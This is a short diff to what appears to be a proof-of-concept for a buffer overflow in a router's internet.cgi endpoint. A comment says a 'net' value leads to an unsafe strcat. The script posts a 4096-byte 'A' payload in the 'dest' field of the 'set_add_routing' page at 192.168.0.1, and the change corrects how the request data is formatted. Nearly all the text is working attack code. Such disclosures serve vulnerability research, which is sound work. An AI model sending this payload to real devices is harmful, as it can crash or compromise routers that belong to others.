@@ -27,5 +27,5 @@ if v5 equal 'net', call strcat, causee buff overflow
 url = "http://192.168.0.1/cgi-bin/internet.cgi"
 payload = 'A'*0x1000 + '\n'
 
-r = requests.post(url, data={ 'page=set_add_routing&dest=' + payload + '&hostnet=net'})
+r = requests.post(url, data={ 'page':'set_add_routing', 'dest': payload ,'hostnet':'net'})
 ``` 
